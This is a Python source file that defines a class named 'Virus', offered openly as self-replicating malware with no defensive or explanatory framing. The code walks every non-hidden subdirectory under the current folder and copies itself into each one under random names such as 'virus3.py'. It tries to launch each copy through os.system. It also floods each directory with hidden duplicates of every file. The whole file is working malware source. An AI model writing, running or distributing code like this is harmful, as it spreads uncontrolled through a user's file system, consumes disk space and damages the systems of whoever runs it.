import os 
import shutil
import random

class Virus:
    def __init__(self, path=None,target_dir=None,repeat=None):
        self.path=path
        self.target_dir = []
        self.repeat=2
        self.own_path=os.path.realpath(__file__)

    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir=os.listdir(path)
        for i in current_dir:
            if not i.startswith("."):
                absolutepath=os.path.join(path,i)
                if os.path.isdir(absolutepath):
                    self.list_directories(absolutepath)
                else:
                    pass
    
    def newVirus(self):
        for i in self.target_dir:
            num=random.randint(0,10)
            newName="virus"+str(num)+".py"
            destination=os.path.join(i,newName)
            shutil.copyfile(self.own_path,destination)
            os.system(newName+" 1")

    def replicate(self):
        for i in self.target_dir:
            filelist=os.listdir(i)
            for file in filelist:
                absolutepath=os.path.join(i,file)
                if not absolutepath.startswith(".") and not os.path.isdir(absolutepath):
                    source=absolutepath
                    for x in range(self.repeat):
                        destination=os.path.join(i,("."+file+str(x)))
                        shutil.copyfile(source,destination)
    
    def virusAction(self):
        self.list_directories(self.path)
        self.newVirus()
        self.replicate()

if __name__=="__main__":
    current_dir=os.path.abspath("")
    virus=Virus(path=current_dir)
    virus.virusAction()
